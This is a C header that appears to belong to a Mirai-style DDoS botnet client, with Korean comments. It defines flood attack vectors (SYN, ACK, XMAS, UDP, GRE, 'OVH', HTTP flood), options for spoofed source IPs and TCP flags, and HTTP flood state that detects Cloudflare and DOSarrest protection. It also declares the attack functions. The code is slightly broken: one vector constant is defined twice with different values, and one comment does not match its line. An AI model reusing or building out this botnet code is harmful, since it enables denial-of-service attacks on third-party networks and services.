#pragma once
#include <time.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include "includes.h"
#include "protocol.h"
#define ATTACK_CONCURRENT_MAX   15

#ifdef DEBUG
#define HTTP_CONNECTION_MAX     1000
#else
#define HTTP_CONNECTION_MAX     256
#endif


struct attack_target {
    struct sockaddr_in sock_addr;
    ipv4_t addr;
    uint8_t netmask;
};
struct attack_option {
    char *val;
    uint8_t key;
};
typedef void (*ATTACK_FUNC) (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
typedef uint8_t ATTACK_VECTOR;
#define ATK_VEC_SYN        0
#define ATK_VEC_ACK        1
#define ATK_VEC_USYN       2
#define ATK_VEC_TCPALL     3
#define ATK_VEC_TCPFRAG    4
#define ATK_VEC_ASYN       5
#define ATK_VEC_GAME       6
#define ATK_VEC_UDPPLAIN   7
#define ATK_VEC_GREIP 	   8
#define ATK_VEC_STD        9

#define ATK_VEC_OVH       10
#define ATK_VEC_HTTP      11 

#define ATK_VEC_GREIP     12

#define ATK_VEC_XMAS      13

#define ATK_OPT_PAYLOAD_SIZE    0   // 패킷 데이터의 크기는 얼마입니까?
#define ATK_OPT_PAYLOAD_RAND    1   // 패킷 데이터 내용을 무작위 화해야합니까?
#define ATK_OPT_IP_TOS          2   // IP 헤더의 토스 필드
#define ATK_OPT_IP_IDENT        3   // IP 헤더의 식별 필드
#define ATK_OPT_IP_TTL          4   // IP 헤더의 Ttl 필드
#define ATK_OPT_IP_DF           5   // 비트 세트를 조각화하지 마십시오
#define ATK_OPT_SPORT           6   // 소스 포트를 강제해야합니까? (0 = 무작위)
#define ATK_OPT_DPORT           7   // 대상 포트를 강제해야합니까? (0 = 무작위)
#define ATK_OPT_DOMAIN          8   // DNS 공격의 도메인 이름
#define ATK_OPT_DNS_HDR_ID      9   // 도메인 이름 헤더 ID
#define ATK_OPT_URG             11  // TCP URG 헤더 플래그
#define ATK_OPT_ACK             12  // TCP ACK 헤더 플래그
#define ATK_OPT_PSH             13  // TCP PSH 헤더 플래그
#define ATK_OPT_RST             14  // TCP RST 헤더 플래그
#define ATK_OPT_SYN             15  // TCP SYN 헤더 플래그
#define ATK_OPT_FIN             16  // TCP FIN 헤더 플래그
#define ATK_OPT_SEQRND          17  // 시퀀스 번호를 강제해야합니까? (TCP 뿐)
#define ATK_OPT_ACKRND          18  // ack 번호를 강제해야합니까? (TCP 뿐)
#define ATK_OPT_GRE_CONSTIP     19  // 캡슐화 된 목적지 주소가 목적지와 같아야합니까?
#define ATK_OPT_METHOD			20	// HTTP 플러드 방법
#define ATK_OPT_POST_DATA		21	// HTTP Flood로 게시 할 모든 데이터
#define ATK_OPT_PATH            22  // HTTP 플러드 경로
#define ATK_OPT_HTTPS           23  // 이 URL은 SSL / HTTPS입니까?
#define ATK_OPT_CONNS           24  // 사용할 소켓 수
#define ATK_OPT_SOURCE          25  // 소스 IP



struct attack_method {
    ATTACK_FUNC func;
    ATTACK_VECTOR vector;
};

#define HTTP_CONN_INIT          0 // 초기 상태
#define HTTP_CONN_RESTART       1 // 다음 스핀 연결이 다시 시작되도록 예약
#define HTTP_CONN_CONNECTING    2 // 연결을 기다리는 중
#define HTTP_CONN_HTTPS_STUFF   3 // 협상과 같은 필수 HTTPS 항목 처리
#define HTTP_CONN_SEND          4 // HTTP 요청 보내기
#define HTTP_CONN_SEND_HEADERS  5 // HTTP 헤더 보내기 
#define HTTP_CONN_RECV_HEADER   6 // HTTP 헤더를 가져와 해당 위치 또는 쿠키 등을 확인하십시오.
#define HTTP_CONN_RECV_BODY     7 // HTTP 본문 가져 오기 및 CF IAUA 모드 확인
#define HTTP_CONN_SEND_JUNK		8 // 최대한 많은 데이터를 보내십시오
#define HTTP_CONN_SNDBUF_WAIT   9 // 소켓이 사용 가능할 때까지 기다리십시오.
#define HTTP_CONN_QUEUE_RESTART 10 // 연결을 다시 시작하거나 새 요청을 보내십시오. 그러나 먼저 사용 가능한 다른 데이터를 읽으십시오.
#define HTTP_CONN_CLOSED        11 // Close connection and move on

#define HTTP_RDBUF_SIZE         1024
#define HTTP_HACK_DRAIN         64
#define HTTP_PATH_MAX           256
#define HTTP_DOMAIN_MAX         128
#define HTTP_COOKIE_MAX         5   // 연결을 닫고 계속
#define HTTP_COOKIE_LEN_MAX     128 // 최대 쿠키 LEN
#define HTTP_POST_MAX           512 // 최대 포스트 데이터 LEN

#define HTTP_PROT_DOSARREST     1 // Server: DOSarrest
#define HTTP_PROT_CLOUDFLARE    2 // Server: cloudflare-nginx

struct attack_http_state {
    int fd;
    uint8_t state;
    int last_recv;
    int last_send;
    ipv4_t dst_addr;
    char user_agent[512];
    char path[HTTP_PATH_MAX + 1];
    char domain[HTTP_DOMAIN_MAX + 1];
    char postdata[HTTP_POST_MAX + 1];
    char method[9];
    char orig_method[9];

    int protection_type;

    int keepalive;
    int chunked;
    int content_length;

    int num_cookies;
    char cookies[HTTP_COOKIE_MAX][HTTP_COOKIE_LEN_MAX];

    int rdbuf_pos;
    char rdbuf[HTTP_RDBUF_SIZE];
};

struct attack_cfnull_state {
    int fd;
    uint8_t state;
    int last_recv;
    int last_send;
    ipv4_t dst_addr;
    char user_agent[512];
    char domain[HTTP_DOMAIN_MAX + 1];
    int to_send;
};
struct attack_xmas_data {
    ipv4_t addr;
    uint32_t seq, ack_seq;
    port_t sport, dport;
};




BOOL attack_init(void);
void attack_kill_all(void);
void attack_parse(char *, int);
void attack_start(int, ATTACK_VECTOR, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
char *attack_get_opt_str(uint8_t, struct attack_option *, uint8_t, char *);
int attack_get_opt_int(uint8_t, struct attack_option *, uint8_t, int);
uint32_t attack_get_opt_ip(uint8_t, struct attack_option *, uint8_t, uint32_t);

// 실제 공격

void attack_method_tcpack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpall(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpfrag(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_xmas(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

void attack_method_asyn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpsyn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpusyn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

void attack_method_udpgame(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_udpplain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

void attack_method_greip(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

void attack_method_std(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

void attack_method_ovh(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

void attack_app_proxy(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_app_http(uint8_t, struct attack_target *, uint8_t, struct attack_option *);



static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
static void free_opts(struct attack_option *, int);
